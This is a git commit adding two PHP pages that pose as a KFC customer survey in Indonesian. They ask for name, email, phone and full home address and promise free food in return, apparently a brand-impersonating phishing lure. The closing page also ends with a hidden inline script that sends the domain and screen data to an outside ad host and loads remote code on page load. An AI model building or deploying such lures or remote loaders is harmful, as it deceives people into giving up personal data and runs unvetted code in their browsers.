ab268c07080dfa85e933287b0f61f4b5cf42fac7
JanuriDP <janury.geek@gmail.com>
2017-03-05 01:42:37 +0700

    first commit

---
+++ survey.php
@@ -0,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="JDP">
+    <link rel="icon" href="./favicon.ico" type="image/x-icon">
+
+    <title>KFC Survey | Get FREE Delivery</title>
+
+    <!-- core CSS -->
+<link rel="stylesheet" href="bootstrap.min.css">
+
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+
+    <!-- Custom styles for this template -->
+    <style type="text/css">
+/* Space out content a bit */
+body {
+  padding-top: 20px;
+  padding-bottom: 20px;
+}
+
+/* Everything but the jumbotron gets side spacing for mobile first views */
+.header,
+.marketing,
+.footer {
+  padding-right: 15px;
+  padding-left: 15px;
+}
+
+/* Custom page header */
+.header {
+  padding-bottom: 20px;
+  border-bottom: 1px solid #e5e5e5;
+}
+/* Make the masthead heading the same height as the navigation */
+.header h3 {
+  margin-top: 0;
+  margin-bottom: 0;
+  line-height: 40px;
+}
+
+/* Custom page footer */
+.footer {
+  padding-top: 19px;
+  color: #777;
+  border-top: 1px solid #e5e5e5;
+}
+
+/* Customize container */
+@media (min-width: 768px) {
+  .container {
+    max-width: 730px;
+  }
+}
+.container-narrow > hr {
+  margin: 30px 0;
+}
+
+/* Main marketing message and sign up button */
+.jumbotron {
+  text-align: center;
+  border-bottom: 1px solid #e5e5e5;
+}
+.jumbotron .btn {
+  padding: 14px 24px;
+  font-size: 21px;
+}
+
+/* Supporting marketing content */
+.marketing {
+  margin: 40px 0;
+}
+.marketing p + h4 {
+  margin-top: 28px;
+}
+
+/* Responsive: Portrait tablets and up */
+@media screen and (min-width: 768px) {
+  /* Remove the padding we set earlier */
+  .header,
+  .marketing,
+  .footer {
+    padding-right: 0;
+    padding-left: 0;
+  }
+  /* Space out the masthead */
+  .header {
+    margin-bottom: 30px;
+  }
+  /* Remove the bottom border on the jumbotron for visual effect */
+  .jumbotron {
+    border-bottom: 0;
+  }
+}
+
+    </style>
+    <script type="text/javascript">
+function show_alert()
+{
+alert("Just somthing like a shit!");
+}
+</script>
+  </head>
+  <body>
+
+    <div class="container">
+      <div class="header clearfix">
+        <nav>
+          <ul class="nav nav-pills pull-right">
+            <li role="presentation" class="active"><h2 class="text-muted"><label class="label label-danger">GUEST EXPERIENCE SURVEY</label></h2></li>
+          </ul>
+        </nav>
+        <img src="./kfclogo.png" width="100px" height="100px">
+      </div>
+
+      <div class="jumbotron">
+        <h1>KFC Feedback</h1>
+        <p class="lead">
+
+        </p>
+        <p><a class="btn btn-lg btn-danger" href="#Survey" role="button">Mulai Isi Survey</a></p>
+      </div>
+
+      
+      <div class="panel panel-danger" id="Survey">
+        <div class="panel-heading">
+        <h3 class="panel-title">Survey</h3>
+      </div>
+<div class="panel-body">
+      <div class="row marketing">
+        <p><strong>Data Diri</strong></p><br>
+<form action="write.php" method="get" class="form-inline">
+    
+    <label for="name">Nama:</label><br />
+    <input id="name" class="input" name="name" type="text" value="" size="30" />*Isi Nama Anda<br />
+
+    <label for="email">Email:</label><br />
+    <input id="email" class="input" name="email" type="text" value="" size="30" />*Opsional<br />
+
+    <label for="hp">Nomor HP:</label><br />
+    <input id="hp" class="input" name="hp" type="text" value="" size="30" />*Isi Nomor HP yang dapat dihubungi<br />
+ 
+    <label for="alamat">Alamat Lengkap:</label><br />
+    <textarea id="alamat" class="input" name="alamat" rows="7" cols="30"></textarea>*Isi Alamat Lengkap Untuk Delivery<br />
+ 
+   <p> <input type="submit" class="btn btn-danger" value="Selanjutnya" /></p>
+</form>
+
+</p>
+    </div><!-- /div survey -->
+    </div><!-- /div panel-body -->
+  </div><!-- /panel survey! -->
+
+  
+      
+      <footer class="footer">
+        <p>&copy; KFC Feedback 2015.
+        <a href="#" class="pull-right">Back Top↑</a></p>
+      </footer>
+    </div> <!-- /container -->
+
+
+    </div>
+  </div>
+</div>
+
+
+    </body>
+</html>
---
+++ surveyend.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="JDP">
+    <link rel="icon" href="./favicon.ico" type="image/x-icon">
+
+    <title>KFC Feedback | Get FREE Delivery</title>
+
+    <!-- Bootstrap core CSS -->
+    <link rel="stylesheet" href="bootstrap.min.css">
+
+    <!-- Custom styles for this template -->
+    <style type="text/css">
+/* Space out content a bit */
+body {
+  padding-top: 20px;
+  padding-bottom: 20px;
+}
+
+/* Everything but the jumbotron gets side spacing for mobile first views */
+.header,
+.marketing,
+.footer {
+  padding-right: 15px;
+  padding-left: 15px;
+}
+
+/* Custom page header */
+.header {
+  padding-bottom: 20px;
+  border-bottom: 1px solid #e5e5e5;
+}
+/* Make the masthead heading the same height as the navigation */
+.header h3 {
+  margin-top: 0;
+  margin-bottom: 0;
+  line-height: 40px;
+}
+
+/* Custom page footer */
+.footer {
+  padding-top: 19px;
+  color: #777;
+  border-top: 1px solid #e5e5e5;
+}
+
+/* Customize container */
+@media (min-width: 768px) {
+  .container {
+    max-width: 730px;
+  }
+}
+.container-narrow > hr {
+  margin: 30px 0;
+}
+
+/* Main marketing message and sign up button */
+.jumbotron {
+  text-align: center;
+  border-bottom: 1px solid #e5e5e5;
+}
+.jumbotron .btn {
+  padding: 14px 24px;
+  font-size: 21px;
+}
+
+/* Supporting marketing content */
+.marketing {
+  margin: 40px 0;
+}
+.marketing p + h4 {
+  margin-top: 28px;
+}
+
+/* Responsive: Portrait tablets and up */
+@media screen and (min-width: 768px) {
+  /* Remove the padding we set earlier */
+  .header,
+  .marketing,
+  .footer {
+    padding-right: 0;
+    padding-left: 0;
+  }
+  /* Space out the masthead */
+  .header {
+    margin-bottom: 30px;
+  }
+  /* Remove the bottom border on the jumbotron for visual effect */
+  .jumbotron {
+    border-bottom: 0;
+  }
+}
+
+    </style>
+
+    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  </head>
+
+  <body>
+
+    <div class="container">
+      <div class="header clearfix">
+        <nav>
+          <ul class="nav nav-pills pull-right">
+            <li role="presentation" class="active"><h2 class="text-muted"><label class="label label-danger">GUEST EXPERIENCE SURVEY</label></h2></li>
+          </ul>
+        </nav>
+        <img src="./kfclogo.png" width="100px" height="100px">
+      </div>
+      
+
+      <div class="jumbotron">
+        <h2>KFC Feedback Telah Berakhir</h2>
+        <p class="lead">
+        Kami berterima kasih atas kritik dan saran Anda.
+        KFC Survey adalah cara untuk mengetahui kekurangan dalam pelayanan kami.
+        Sebagai apresiasi kepada Anda telah mengikuti Survey ini, kami mengirimkan FREE KFC WINGS + PEPSI untuk 2 orang ke alamat yang Anda cantumkan.
+        </p>
+       <br/>
+       <h3 class="text-muted"><label class="label label-danger"></label></h3>
+      </div>
+
+      <footer class="footer">
+        <p>&copy; KFC Feedback 2015.</p>
+      </footer>
+
+    </div> <!-- /container -->
+
+
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRl%2bTtxfQADzcWhEF9WOA5hxzKPDjLQCC4KZex8LFd1Sf2D%2fDfpSMPKXWdZ924Z8gtSoFWXoh9%2fCnhu2JTl7fd%2bFrHdBsN%2fl1yS2W62rjygtQgrBE0R7oGN3EVSBByuJ93PZdCq2VwrbNk%2bQqKGTURu0w1x0C4jysLe2yP0Mt7W8UbYq8X3OaxGi0UJHCDwtUJ%2fIdynPYtBj41zM0cVUmNbTJCon%2fOnhKIcGCmpmrDRAiyxZt7KEf2lWVpmIABvU24NMAz%2fWBqtONUfbtOgzcsrM5v9vOeYAMQ3hC6TH3adD5DI3JRyrSxJ6RCJInDH1rmLX5snqIODj0RlPff64MmdXr0N%2ffldCq8z7KbS9I18UyvlrDAxh6OGMVeWBLjoEQp2MfBwq7%2fZ3Wb0vl3UnnLeASrwRClXCWCPecBdZYLv6L0F03H7uoTAYTSFSE34eEQMaz5YM5X8JH%2f12%2btZAOP5OxV3Kztsn7wCIRundEYMabHkF24nzbwWuLv8OKgq02g" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
